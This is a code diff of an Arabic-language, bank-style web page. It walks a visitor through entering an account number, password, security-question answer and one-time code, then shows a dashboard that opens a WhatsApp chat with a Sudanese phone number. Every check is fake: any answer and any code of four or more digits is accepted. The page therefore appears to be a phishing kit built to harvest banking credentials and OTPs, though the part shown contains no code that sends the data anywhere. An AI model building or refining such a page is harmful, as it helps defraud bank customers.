                 showError('كلمة المرور ضعيفة، يجب أن تحتوي على:\n' + errors.join('\n'));
                 return;
             }
 
             showOverlay();
-
-            setTimeout(function() {
+            setTimeout(() => {
                 hideOverlay();
-                document.getElementById('loginPage').style.display = 'none';
-                document.getElementById('securityPage').style.display = 'block';
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('step2').style.display = 'block';
                 document.getElementById('footer').style.marginTop = '0';
                 currentQuestionIndex = 0;
                 updateQuestion();
-            }, 2000);
+            }, 1500);
         });
 
-        // ===== منع إدخال غير أرقام =====
         document.getElementById('accountNumber').addEventListener('input', function(e) {
             this.value = this.value.replace(/\D/g, '');
             clearMessages();
         });
+        document.getElementById('password').addEventListener('input', function() { clearMessages(); });
 
-        document.getElementById('password').addEventListener('input', function() {
-            clearMessages();
-        });
+        // ===== الخطوة 2: سؤال الأمان =====
+        function updateQuestion() {
+            document.getElementById('questionText').textContent = securityQuestions[currentQuestionIndex];
+            document.getElementById('securityAnswer').value = '';
+            document.getElementById('securityAnswer').focus();
+            hideSystemMessage('securitySystemMessage');
+        }
 
-        // ===== السماح بدخول Enter =====
-        document.getElementById('securityAnswer').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                verifySecurity();
+        function nextQuestion() {
+            currentQuestionIndex = (currentQuestionIndex + 1) % securityQuestions.length;
+            updateQuestion();
+        }
+
+        function verifySecurity() {
+            const answer = document.getElementById('securityAnswer').value.trim();
+            hideSystemMessage('securitySystemMessage');
+            if (answer === '') {
+                showSystemMessage('securitySystemMessage', 'الرجاء إدخال الإجابة على سؤال الأمان', 'error');
+                return;
             }
+            showSystemMessage('securitySystemMessage', '✅ تم التحقق من الإجابة بنجاح', 'success');
+            setTimeout(() => {
+                document.getElementById('step2').style.display = 'none';
+                document.getElementById('step3').style.display = 'block';
+                document.getElementById('footer').style.marginTop = '0';
+                startOtpTimer();
+                hideSystemMessage('securitySystemMessage');
+            }, 1000);
+        }
+
+        function cancelSecurity() {
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('step1').style.display = 'block';
+            document.getElementById('footer').style.marginTop = '30px';
+            document.getElementById('accountNumber').value = '';
+            document.getElementById('password').value = '';
+            document.getElementById('securityAnswer').value = '';
+            hideSystemMessage('securitySystemMessage');
+        }
+
+        function showAtmMessage() {
+            document.getElementById('atmOverlay').classList.add('active');
+        }
+        function closeAtmMessage() {
+            document.getElementById('atmOverlay').classList.remove('active');
+        }
+
+        document.getElementById('securityAnswer').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') verifySecurity();
         });
+
+        // ===== الخطوة 3: OTP (عداد 60 دقيقة) =====
+        function startOtpTimer() {
+            timeSeconds = 3600;
+            updateOtpDisplay();
+            if (timerInterval) clearInterval(timerInterval);
+            timerInterval = setInterval(function() {
+                timeSeconds--;
+                updateOtpDisplay();
+                if (timeSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                }
+            }, 1000);
+        }
+
+        function updateOtpDisplay() {
+            const mins = Math.floor(timeSeconds / 60);
+            const secs = timeSeconds % 60;
+            document.getElementById('otpTimerDisplay').textContent = 
+                String(mins).padStart(2, '0') + ':' + String(secs).padStart(2, '0');
+        }
+
+        function submitOtp() {
+            const otp = document.getElementById('otpInput').value.trim();
+            hideSystemMessage('otpSystemMessage');
+            if (otp === '') {
+                showSystemMessage('otpSystemMessage', 'الرجاء إدخال الرمز السري', 'error');
+                return;
+            }
+            if (otp.length < 4) {
+                showSystemMessage('otpSystemMessage', 'الرمز يجب أن يكون 4-6 أرقام', 'error');
+                return;
+            }
+            showSystemMessage('otpSystemMessage', '✅ تم التحقق بنجاح!', 'success');
+            setTimeout(() => {
+                document.getElementById('step3').style.display = 'none';
+                document.getElementById('step4').style.display = 'block';
+                document.getElementById('footer').style.marginTop = '0';
+                hideSystemMessage('otpSystemMessage');
+                if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
+            }, 1500);
+        }
+
+        function whatsappContact() {
+            window.open('https://wa.me/249116001913', '_blank');
+        }
 
         document.getElementById('otpInput').addEventListener('keypress', function(e) {
-            if (e.key === 'Enter') {
-                submitOtp();
-            }
+            if (e.key === 'Enter') submitOtp();
         });
-
-        // ===== منع إدخال غير أرقام في OTP =====
         document.getElementById('otpInput').addEventListener('input', function(e) {
             this.value = this.value.replace(/\D/g, '');
         });
 
-        // ===== إغلاق رسالة الصراف بالضغط خارجها =====
-        document.getElementById('atmOverlay').addEventListener('click', function(e) {
-            if (e.target === this) {
-                this.classList.remove('active');
+        // ===== الخطوة 4: لوحة التحكم =====
+        function logout() {
+            if (confirm('هل أنت متأكد من تسجيل الخروج؟')) {
+                document.getElementById('step4').style.display = 'none';
+                document.getElementById('step1').style.display = 'block';
+                document.getElementById('footer').style.marginTop = '30px';
+                document.getElementById('accountNumber').value = '';
+                document.getElementById('password').value = '';
+                document.getElementById('otpInput').value = '';
+                clearMessages();
+                hideSystemMessage('otpSystemMessage');
+                if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
             }
-        });
+        }
     </script>
-
 </body>
 </html>
